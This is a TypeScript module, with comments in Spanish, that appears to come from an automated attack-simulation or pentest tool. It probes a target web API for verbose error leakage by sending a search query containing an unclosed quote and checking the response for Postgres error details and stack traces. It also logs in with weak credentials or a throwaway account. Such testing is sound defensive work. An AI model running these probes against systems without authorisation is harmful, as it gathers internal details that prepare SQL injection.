/**
 * Ataque real: errores verbosos. El error handler devuelve code, detail, hint,
 * position y stack al cliente, sin mirar NODE_ENV. Provocamos un error de SQL y
 * verificamos que la respuesta filtra internos. Solo lectura.
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../http.ts';
import { loginApi, registerThrowaway } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../types.ts';

const LEAK_FIELDS = ['code', 'detail', 'hint', 'position', 'where', 'stack'];

export const verboseErrors: Attack = {
  meta: CATALOG['verbose-errors'],
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];

    let token: string;
    if (ctx.target.weak_login) {
      const s = await loginApi(ctx, ctx.target.weak_login.email, ctx.target.weak_login.password);
      token = s ? s.token : (await registerThrowaway(ctx)).token;
    } else {
      token = (await registerThrowaway(ctx)).token;
    }

    // Una comilla sin cerrar rompe la query de búsqueda.
    const res = await ctx.http.get(`/api/notes?q=${encodeURIComponent("'")}`, { token });
    const body = (res.json ?? {}) as Record<string, unknown>;
    const leaked = LEAK_FIELDS.filter((f) => body[f] !== undefined || /"?stack"?\s*:/.test(res.text));
    const hasStack = typeof body['stack'] === 'string' || /\bat \S+ \(/.test(res.text);
    const fingerprintsPg = /postgres|pg_|syntax error|unterminated|\bpg-pool\b|\b42\d{3}\b/i.test(res.text);
    const confirmed = leaked.length > 0 || hasStack || fingerprintsPg;

    steps.push({
      technique: 'Provocar un error no manejado (SQL roto)',
      mitre: ['T1592'],
      request: reqLine('GET', "/api/notes?q='"),
      response_summary: `HTTP ${res.status} — ${confirmed ? `fuga de internos: ${leaked.join(', ') || 'stack/fingerprint Postgres'}` : 'error genérico'}`,
      exchange: res.exchange,
      note: confirmed ? 'El cliente recibe el detalle del error: motor de BDD, posición en la query y rutas internas.' : undefined,
    });

    return {
      vuln_id: verboseErrors.meta.id,
      confirmed,
      blocked: !confirmed,
      steps,
      gained: confirmed ? ['fingerprint de la BDD, posición del error y rutas internas'] : [],
      foothold: confirmed ? { type: 'data', detail: 'información interna para afinar otros ataques' } : undefined,
      attacker_active: false,
      summary: confirmed
        ? 'Errores verbosos confirmados: la respuesta expone detalle de Postgres y/o stack trace, facilitando la SQLi a ciegas.'
        : 'Los errores devuelven un mensaje genérico: no filtran internos.',
    };
  },
};
